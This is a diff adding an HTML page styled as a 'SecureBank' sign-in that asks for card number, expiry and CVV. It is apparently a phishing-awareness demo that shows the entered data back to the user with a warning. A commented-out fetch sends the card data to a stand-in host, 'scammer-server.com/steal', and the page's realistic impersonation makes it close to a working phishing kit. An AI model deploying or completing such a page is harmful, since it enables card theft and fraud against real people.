@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureBank - Login</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 450px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 150px;
+        }
+        h2 {
+            font-size: 24px;
+            color: #1a3c6c;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin: 10px 0 5px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+            margin-bottom: 15px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1a3c6c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #132a4f;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
+        #warning {
+            color: #d32f2f;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://via.placeholder.com/150x50?text=SecureBank" alt="SecureBank Logo">
+        </div>
+        <h2>Sign in to SecureBank</h2>
+        <form id="phishingForm">
+            <label for="cardNumber">Credit Card Number</label>
+            <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            <label for="expiry">Expiration Date</label>
+            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+            <label for="cvv">CVV</label>
+            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
+            <button type="button" onclick="simulateRealPhishing()">Sign In</button>
+        </form>
+        <div class="footer">
+            <p>© 2025 SecureBank. All rights reserved.</p>
+        </div>
+        <p id="warning"></p>
+    </div>
+
+    <script>
+        // Add basic input formatting for realism
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '').substring(0,16);
+            value = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = value;
+        });
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '').substring(0,4);
+            if (value.length > 2) value = value.substring(0,2) + '/' + value.substring(2);
+            e.target.value = value;
+        });
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0,3);
+        });
+
+        function simulateRealPhishing() {
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (cardNumber && expiry && cvv) {
+                // Simulate what a real phishing page would do
+                const fakePayload = {
+                    cardNumber: cardNumber,
+                    expiry: expiry,
+                    cvv: cvv,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // In a real attack, this would be sent to a scammer's server like this:
+                // fetch('https://scammer-server.com/steal', {
+                //     method: 'POST',
+                //     headers: { 'Content-Type': 'application/json' },
+                //     body: JSON.stringify(fakePayload)
+                // });
+                
+                // Instead, we just show the "stolen" data locally
+                document.getElementById('warning').innerText = 
+                    `WARNING: In a real phishing attack, this data—Card: ${cardNumber}, Expiry: ${expiry}, CVV: ${cvv}—would now belong to a scammer. This is a demo; nothing was sent or stored.`;
+            } else {
+                document.getElementById('warning').innerText = "Please fill in all fields.";
+            }
+        }
+    </script>
+</body>
+</html>
